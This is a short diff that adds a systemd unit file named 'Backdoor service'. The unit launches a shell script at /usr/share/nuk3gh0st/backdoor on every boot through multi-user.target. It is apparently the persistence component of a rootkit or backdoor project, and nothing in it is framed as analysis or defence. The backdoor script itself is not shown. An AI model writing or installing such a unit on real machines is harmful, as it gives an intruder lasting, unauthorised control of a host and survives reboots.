@@ -1,0 +1,8 @@
+[Unit]
+Description=Backdoor service
+
+[Service]
+ExecStart=/bin/sh /usr/share/nuk3gh0st/backdoor
+
+[Install]
+WantedBy=multi-user.target
